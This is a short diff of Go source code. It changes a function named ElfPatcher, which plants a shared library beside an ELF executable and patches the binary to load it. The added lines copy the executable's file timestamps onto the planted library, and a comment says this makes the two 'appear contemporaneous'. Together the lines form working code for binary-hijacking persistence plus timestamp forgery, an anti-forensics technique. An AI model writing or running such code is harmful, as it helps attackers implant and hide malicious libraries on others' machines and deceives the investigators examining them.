@@ -354,6 +354,12 @@ func ElfPatcher(elfPath, soPath, targetPath string) error {
 
 	log.Printf("Copied SO file to: %s", finalSOPath)
 
+	// Copy timestamps from ELF file to SO file to make them appear contemporaneous
+	err = agentutils.CopyFileTimes(elfPath, finalSOPath)
+	if err != nil {
+		log.Printf("Warning: failed to copy file times from %s to %s: %v", elfPath, finalSOPath, err)
+	}
+
 	// Patch the ELF file to load our SO
 	err = exeutil.AddDTNeeded(elfPath, finalSOPath)
 	if err != nil {
